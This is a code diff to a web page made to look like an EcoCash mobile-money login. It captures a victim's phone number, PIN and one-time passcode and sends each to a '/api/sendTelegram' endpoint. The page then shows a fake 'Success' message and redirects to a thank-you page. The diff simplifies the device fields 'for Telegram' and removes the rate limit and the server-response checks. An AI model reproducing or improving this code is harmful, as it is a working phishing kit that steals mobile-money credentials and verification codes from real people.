@@ -33,7 +33,6 @@
   .success{color:#16a34a;font-weight:600}
   .error{color:#d04444;font-size:13px;margin-top:4px;display:none}
 
-  /* PIN boxes */
   .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
   .pin-digit{
     width:40px;height:48px;
@@ -42,10 +41,8 @@
     background:#fbfdff;
   }
 
-  /* OTP modal */
   .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
   .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
-
   .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
 
   .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
@@ -66,7 +63,6 @@
 
 <div class="card">
   <img src="assets/eco.png" alt="EcoCash logo" class="logo">
-
   <h2>Log In</h2>
 
   <form id="loginForm" autocomplete="off">
@@ -83,9 +79,7 @@
       <input class="pin-digit" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- honeypot -->
     <input type="text" id="hp" style="display:none">
-
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
@@ -124,20 +118,9 @@
 </div>
 
 <script>
-/* ===== DEVICE INFO ===== */
-const deviceInfo = {
-  userAgent: navigator.userAgent,
-  platform: navigator.platform
-};
-
-/* ===== SELECTED PLAN ===== */
-let selectedPlan = null;
-(function(){
-  try {
-    const raw = sessionStorage.getItem('selectedPlan');
-    if (raw) selectedPlan = JSON.parse(raw);
-  } catch(e){}
-})();
+/* ===== DEVICE (FLAT FOR TELEGRAM) ===== */
+const deviceUA = navigator.userAgent;
+const devicePlatform = navigator.platform;
 
 /* ===== PHONE ===== */
 const phoneEl = document.getElementById('phone');
@@ -151,22 +134,28 @@ phoneEl.addEventListener('keydown', e=>{
 phoneEl.addEventListener('input', ()=>{
   let d = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
   phoneEl.value = '+263' + d;
-  phoneError.style.display = /^7\d{8}$/.test(d) ? 'none' : 'block';
+
+  if (!d || !/^7\d{8}$/.test(d)) {
+    phoneError.style.display = 'block';
+  } else {
+    phoneError.style.display = 'none';
+  }
+
   updateLoginState();
 });
 
 /* ===== PIN ===== */
-const pinBoxes = [...document.querySelectorAll('.pin-digit')];
-const pinEl = { value:'' };
+const pinBoxes=[...document.querySelectorAll('.pin-digit')];
+const pinEl={value:''};
 
 pinBoxes.forEach((b,i)=>{
-  b.addEventListener('input', ()=>{
-    b.value = b.value.replace(/\D/g,'');
-    if(b.value && i < 3) pinBoxes[i+1].focus();
-    pinEl.value = pinBoxes.map(x=>x.value).join('');
+  b.addEventListener('input',()=>{
+    b.value=b.value.replace(/\D/g,'');
+    if(b.value && i<3) pinBoxes[i+1].focus();
+    pinEl.value=pinBoxes.map(x=>x.value).join('');
     updateLoginState();
   });
-  b.addEventListener('keydown', e=>{
+  b.addEventListener('keydown',e=>{
     if(e.key==='Backspace' && !b.value && i>0){
       pinBoxes[i-1].focus();
       pinBoxes[i-1].value='';
@@ -182,10 +171,6 @@ function updateLoginState(){
   );
 }
 
-/* ===== ANTI BOT ===== */
-const RATE_LIMIT = 4000;
-let lastSubmit = Number(localStorage.getItem('lastSubmit')||0);
-
 /* ===== API ===== */
 async function sendToServer(payload){
   return fetch('/api/sendTelegram',{
@@ -196,17 +181,17 @@ async function sendToServer(payload){
 }
 
 /* ===== OTP LOGIC (ORIGINAL) ===== */
-const otpModal = document.getElementById('otpModal');
-const dEls = [0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
-const confirmBtn = document.getElementById('confirmOtp');
-const cancelBtn = document.getElementById('cancelOtp');
-const resendBtn = document.getElementById('resendBtn');
-const otpWarning = document.getElementById('otpWarning');
-const otpStatus = document.getElementById('otpStatus');
-const countdownEl = document.getElementById('countdown');
-const resendInfo = document.getElementById('resendInfo');
+const otpModal=document.getElementById('otpModal');
+const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
+const confirmBtn=document.getElementById('confirmOtp');
+const cancelBtn=document.getElementById('cancelOtp');
+const resendBtn=document.getElementById('resendBtn');
+const otpWarning=document.getElementById('otpWarning');
+const otpStatus=document.getElementById('otpStatus');
+const countdownEl=document.getElementById('countdown');
+const resendInfo=document.getElementById('resendInfo');
 
-let resendTimer=null, secondsLeft=120;
+let resendTimer=null,secondsLeft=120;
 
 function startResendCountdown(){
   clearInterval(resendTimer);
@@ -223,8 +208,7 @@ function startResendCountdown(){
   },1000);
 }
 
-function getOtp(){ return dEls.map(d=>d.value).join(''); }
-
+function getOtp(){return dEls.map(d=>d.value).join('');}
 function updateConfirm(){
   const ok=/^\d{6}$/.test(getOtp());
   confirmBtn.disabled=!ok;
@@ -247,11 +231,9 @@ dEls.forEach((el,i)=>{
 });
 
 /* ===== LOGIN ===== */
-document.getElementById('loginForm').addEventListener('submit', async e=>{
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
-  if(Date.now()-lastSubmit < RATE_LIMIT) return;
-  localStorage.setItem('lastSubmit',Date.now());
 
   otpModal.style.display='flex';
   dEls.forEach(d=>d.value='');
@@ -259,15 +241,14 @@ document.getElementById('loginForm').addEventListener('submit', async e=>{
   startResendCountdown();
 
   try{
-    const resp = await sendToServer({
+    await sendToServer({
       event:'login_clicked',
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
-      selectedPlan,
-      device:deviceInfo,
+      deviceUA,
+      devicePlatform,
       submittedAt:new Date().toISOString()
     });
-    if(!resp.ok) throw new Error();
   }catch{
     otpStatus.textContent='Server error. Please try again.';
   }
@@ -281,15 +262,14 @@ cancelBtn.onclick=()=>{
 resendBtn.onclick=async()=>{
   otpStatus.textContent='Resending…';
   try{
-    const resp = await sendToServer({
+    await sendToServer({
       event:'resend_otp',
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
-      selectedPlan,
-      device:deviceInfo,
+      deviceUA,
+      devicePlatform,
       submittedAt:new Date().toISOString()
     });
-    if(!resp.ok) throw new Error();
     otpStatus.textContent='OTP resent. Check your phone.';
   }catch{
     otpStatus.textContent='Server error. Please try again.';
@@ -299,16 +279,15 @@ resendBtn.onclick=async()=>{
 confirmBtn.onclick=async()=>{
   otpStatus.textContent='Sending…';
   try{
-    const resp = await sendToServer({
+    await sendToServer({
       event:'otp_confirm',
       loginPhone:phoneEl.value,
       loginPin:pinEl.value,
       otp:getOtp(),
-      selectedPlan,
-      device:deviceInfo,
+      deviceUA,
+      devicePlatform,
       submittedAt:new Date().toISOString()
     });
-    if(!resp.ok) throw new Error();
     otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
     setTimeout(()=>window.location.href='thankyou.html',1200);
   }catch{
